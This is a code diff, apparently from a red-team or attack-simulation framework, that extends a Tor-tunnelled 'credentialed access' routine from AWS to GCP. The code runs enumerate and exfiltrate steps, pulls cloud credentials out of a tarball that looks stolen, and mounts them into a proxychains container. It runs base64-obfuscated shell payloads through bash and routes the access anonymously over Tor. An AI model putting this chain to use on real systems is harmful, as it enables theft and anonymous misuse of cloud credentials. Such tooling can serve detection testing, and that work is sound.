@@ -115,8 +115,12 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 if session.platform.Path('/tmp/aws_creds.tgz').exists():
                     session.platform.unlink('/tmp/aws_creds.tgz')
 
-            def credentialed_access_aws_tor(jobname, cwd, script, container='ghcr.io/credibleforce/proxychains-scoutsuite-aws:main'):
+            def credentialed_access_tor(csp, jobname, cwd, script):
                 # start torproxy docker
+                if not csp in ["aws", "gcp", "azure"]:
+                    raise Exception(f'Unknown csp used {csp}')
+
+                container = f'ghcr.io/credibleforce/proxychains-scoutsuite-{csp}:main'
                 try:
                     payload = base64.b64encode(
                         f'docker stop torproxy || true; docker rm torproxy || true; docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy'.encode('utf-8'))
@@ -131,9 +135,9 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     else:
                         log(f"successfully started torproxy docker.")
                         log(
-                            f"stopping and removing and {script} tunnelled container proxychains-{jobname}-aws...")
+                            f"stopping and removing and {script} tunnelled container proxychains-{jobname}-{csp}...")
                         payload = base64.b64encode(
-                            f'docker rm --force proxychains-{jobname}-aws'.encode('utf-8'))
+                            f'docker rm --force proxychains-{jobname}-{csp}'.encode('utf-8'))
                         result = subprocess.run(
                             ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                         log(f'Return Code: {result.returncode}')
@@ -144,8 +148,17 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                             log(f'The bash script encountered an error.')
 
                         log(f"running {script} via torproxy tunnelled container...")
+
+                        # assume credentials prep added creds to local home
+                        if csp == "aws":
+                            local_creds = "$HOME/.aws"
+                            container_creds = "/root/.aws"
+                        elif csp == "gcp":
+                            local_creds = "$HOME/.config/gcloud"
+                            container_creds = "/root/.config/gcloud"
+
                         payload = base64.b64encode(
-                            f'export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; docker run --rm --name=proxychains-{jobname}-aws --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "$PWD/root":"/root" -v "$PWD":"/{jobname}" {container} /bin/bash /{jobname}/{script}'.encode('utf-8'))
+                            f'export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; docker run --rm --name=proxychains-{jobname}-{csp} --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "{local_creds}":"{container_creds}" -v "$PWD":"/{jobname}" {container} /bin/bash /{jobname}/{script}'.encode('utf-8'))
                         result = subprocess.run(
                             ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                         log(f'Return Code: {result.returncode}')
@@ -157,27 +170,43 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 except Exception as e:
                     log(f'Error executing bash script: {e}')
 
-            def prep_local_aws_env(task_name):
+            def prep_local_env(csp, task_name):
                 # create work directory
                 task_path = Path(f"/{task_name}")
                 if task_path.exists() and task_path.is_dir():
                     shutil.rmtree(task_path)
                 task_path.mkdir(parents=True)
 
-                # create aws directory
-                aws_dir = Path.joinpath(Path.home(), Path(".aws"))
-                if aws_dir.exists() and aws_dir.is_dir():
-                    shutil.rmtree(aws_dir)
-                aws_dir.mkdir(parents=True)
+                if csp == "aws":
+                    # create aws directory
+                    aws_dir = Path.joinpath(Path.home(), Path(".aws"))
+                    if aws_dir.exists() and aws_dir.is_dir():
+                        shutil.rmtree(aws_dir)
+                    aws_dir.mkdir(parents=True)
 
-                # extract the aws creds
-                file = tarfile.open(f'/tmp/{hostname}_aws_creds.tgz')
-                file.extract('root/.aws/credentials', task_path)
-                file.extract('root/.aws/config', task_path)
-                shutil.copy2(Path.joinpath(
-                    task_path, 'root/.aws/credentials'), Path.joinpath(aws_dir, 'credentials'))
-                shutil.copy2(Path.joinpath(
-                    task_path, 'root/.aws/config'), Path.joinpath(aws_dir, 'config'))
+                    # extract the first set aws creds
+                    file = tarfile.open(f'/tmp/{hostname}_aws_creds.tgz')
+                    for m in file.members:
+                        if m.isfile() and (m.path.endswith('/.aws/credentials') or m.path.endswith('/.aws/config')):
+                            file.extract(m.path, task_path)
+                            shutil.copy2(Path.joinpath(
+                                task_path, m.path), Path.joinpath(aws_dir, os.path.basename(m.path)))
+                elif csp == "gcp":
+                    # create aws directory
+                    # ~/.config/gcloud/credentials.json
+                    gcp_dir = Path.joinpath(
+                        Path.home(), Path(".config"), Path("gcloud"))
+                    if gcp_dir.exists() and gcp_dir.is_dir():
+                        shutil.rmtree(gcp_dir)
+                    gcp_dir.mkdir(parents=True)
+
+                    # extract the first set aws creds
+                    file = tarfile.open(f'/tmp/{hostname}_gcp_creds.tgz')
+                    for m in file.members:
+                        if m.isfile() and (m.path.endswith('/.config/gcloud/credentials.json')):
+                            file.extract(m.path, task_path)
+                            shutil.copy2(Path.joinpath(
+                                task_path, m.path), Path.joinpath(gcp_dir, os.path.basename(m.path)))
 
                 # copy our payload to the local working directory
                 task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
@@ -197,8 +226,20 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
             if task_name == "instance2rds" or task_name == "iam2rds":
                 enumerate()
                 exfiltrate()
-                prep_local_aws_env(task_name)
-                credentialed_access_aws_tor(
+                prep_local_env("aws", task_name)
+                credentialed_access_tor(
+                    "aws",
+                    task_name,
+                    f'/{task_name}',
+                    f'{task_name}.sh'
+                )
+            # update to add 15 minute timeout
+            elif task_name == "gcpiam2cloudsql":
+                enumerate()
+                exfiltrate()
+                prep_local_env("gcp", task_name)
+                credentialed_access_tor(
+                    "gcp",
                     task_name,
                     f'/{task_name}',
                     f'{task_name}.sh'
